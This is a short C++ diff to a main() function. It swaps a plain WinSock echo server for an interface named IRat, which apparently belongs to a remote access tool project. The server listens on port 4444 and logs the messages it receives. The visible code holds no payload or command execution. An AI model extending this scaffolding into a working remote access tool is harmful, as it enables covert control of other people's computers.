@@ -1,36 +1,21 @@
 #include <memory>
 
+#include "IConnectionListener.h"
 #include "Trace.h"
-#include "IInitializer.h"
-#include "IMessageListener.h"
-#include "Server.h"
+#include "IRat.h"
+#include "MessageType.h"
 
 int main() {
-	std::unique_ptr<IInitializer> initializer = InitializeWinSock();
-
-	const auto server = std::make_unique<Server>(DEFAULT_PORT);
+	const auto rat = CreateRat();
+	const auto server = rat->CreateWinSockConnectionListener(4444);
 	const auto connection = server->WaitForConnection();
 
-	//int bytesReceived;
-
-	//do {
-	//	char receiveBuffer[DEFAULT_BUFLEN];
-	//	bytesReceived = connection->Receive(receiveBuffer, DEFAULT_BUFLEN);
-
-	//	std::string message = std::string(receiveBuffer).substr(0, bytesReceived);
-
-	//	Trace("SERVER: Received %s\n", message.c_str());
-
-	//	connection->Send(message.c_str(), message.length());
-
-	//	Trace("SERVER: Sent %s\n", message.c_str());
-	//}
-	//while (bytesReceived > 0);
-
-	auto listener = CreateMessageListener(connection.get(), [](MessageType type, std::string message)
-	{
-		Trace("SERVER: Received %s\n", message.c_str());
-	});
+	auto listener = rat->CreateMessageListener(
+		connection.get(),
+		[](MessageType type, const std::string message)
+		{
+			Trace("SERVER: Received %s\n", message.c_str());
+		});
 	//connection->Shutdown();
 
 	return 0;
